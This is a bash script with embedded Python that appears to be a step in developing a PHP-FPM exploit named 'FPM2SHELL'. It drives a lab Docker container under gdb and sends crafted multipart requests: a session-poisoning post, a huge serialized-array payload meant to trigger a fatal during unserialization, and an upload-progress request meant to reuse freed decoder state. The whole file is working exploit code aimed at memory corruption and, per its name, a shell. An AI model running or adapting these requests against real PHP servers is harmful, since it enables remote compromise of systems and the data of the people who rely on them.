#!/usr/bin/env bash
# FPM2SHELL module-3 experiment: pre-RINIT upload-progress decoder reuse.
# Fresh worker + fresh gdb; poison session; fatal in app decode; B via parse path.
set -u
SID="f2sre00000000000000000000000002"
TRACE=/tmp/reuse_trace.out

recycle() {
  docker exec f2s-php sh -c "kill \$(pgrep gdb) 2>/dev/null; kill \$(pgrep -f 'pool www') 2>/dev/null"
  sleep 1.5
  PID=$(docker exec f2s-php pgrep -f 'pool www' | head -1)
  echo "[i] worker=$PID"
  docker exec f2s-php sh -c ": > $TRACE"
  docker exec -d f2s-php sh -c "gdb -batch -p $PID -x /tmp/g6.gdb > $TRACE 2>&1"
  sleep 3
}

fire_poison() {
  python3 - "$SID" <<'PYEOF'
import sys, http.client
sid = sys.argv[1]
B = b"----f2sreusepoison00"
body = (b"--"+B+b"\r\nContent-Disposition: form-data; name=\"poison\"\r\n\r\n65536\r\n"
        b"--"+B+b"--\r\n")
c = http.client.HTTPConnection("127.0.0.1", 18120, timeout=60)
c.request("POST", "/poison.php", body=body, headers={
  "Content-Type": f"multipart/form-data; boundary={B.decode()}",
  "Content-Length": str(len(body)), "Cookie": f"PHPSESSID={sid}"})
r = c.getresponse(); print("[P]", r.status, r.read(60).decode("latin1","replace")[:50]); c.close()
PYEOF
}

fire_A() {
  python3 - "$SID" <<'PYEOF'
import sys, http.client
sid = sys.argv[1]
B = b"----f2sreuseA000000"
def part(n, b):
    return b"--"+B+b"\r\nContent-Disposition: form-data; name=\""+n.encode()+b"\"\r\n\r\n"+b+b"\r\n"
elems = b"".join(b"i:%d;a:1:{i:0;i:1;}" % i for i in range(40000))
payload = b"a:%d:{%s}" % (40000, elems)
body = part("filler", b"Q"*4000000) + part("data", payload) + b"--"+B+b"--\r\n"
c = http.client.HTTPConnection("127.0.0.1", 18120, timeout=120)
c.request("POST", "/index.php", body=body, headers={
  "Content-Type": f"multipart/form-data; boundary={B.decode()}",
  "Content-Length": str(len(body)), "Cookie": f"PHPSESSID={sid}"})
r = c.getresponse(); print("[A]", r.status, r.read(40).decode("latin1","replace")[:30]); c.close()
PYEOF
}

fire_B() {
  python3 - "$SID" <<'PYEOF'
import sys, http.client
sid = sys.argv[1]
B = b"----f2sreuseB000000"
def part(n, b, fn=None):
    d = f'Content-Disposition: form-data; name="{n}"'
    if fn is not None: d += f'; filename="{fn}"'
    return b"--"+B+b"\r\n"+d.encode()+b"\r\n\r\n"+b+b"\r\n"
body = (part("PHPSESSID", sid.encode())
        + part("PHP_SESSION_UPLOAD_PROGRESS", b"reuse2")
        + part("f", b"", fn="a")
        + b"".join(part(f"r[{i}]", b"V"*272) for i in range(30))
        + b"--"+B+b"--\r\n")
c = http.client.HTTPConnection("127.0.0.1", 18120, timeout=120)
c.request("POST", "/index.php", body=body, headers={
  "Content-Type": f"multipart/form-data; boundary={B.decode()}",
  "Content-Length": str(len(body)), "Cookie": f"PHPSESSID={sid}"})
r = c.getresponse(); print("[B]", r.status, r.read(60).decode("latin1","replace")[:50]); c.close()
PYEOF
}

recycle
fire_poison
sleep 0.4
echo "[i] before-A trace:"; docker exec f2s-php sh -c "grep -ac UNSERZ $TRACE" || true
fire_A
sleep 0.4
echo "[i] after-A trace:"; docker exec f2s-php sh -c "grep -aE 'UNSERZ|DESTROY' $TRACE | tail -4"
fire_B
sleep 0.5
echo "[i] after-B trace:"; docker exec f2s-php sh -c "grep -aE 'UNSERZ|DESTROY' $TRACE | tail -8"
echo "[i] log:"; docker logs f2s-php --tail 6 2>&1 | grep -E "Fatal|exited" | tail -3
